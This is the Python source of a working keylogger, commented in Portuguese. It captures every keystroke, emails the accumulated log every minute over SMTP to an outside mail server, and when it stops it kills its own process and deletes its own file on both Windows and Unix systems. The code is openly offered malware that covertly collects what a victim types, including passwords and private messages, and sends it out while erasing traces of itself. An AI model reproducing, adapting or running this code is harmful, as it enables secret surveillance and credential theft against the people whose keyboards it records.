import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

EMAIL_ADDRESS = "" #Insere Usuário SMTP
EMAIL_PASSWORD = "" #Insere senha SMTP
SEND_REPORT_EVERY = 60  # em segundos

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log += string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " SPACE "
            elif key == keyboard.Key.esc:
                current_key = " ESC "
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.send_message(msg)

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        # Código para fechar o arquivo e removê-lo
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))  # Para Windows
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')  # Para sistemas Unix-like
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print('File is close.')

# Instancia o KeyLogger e o executa
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
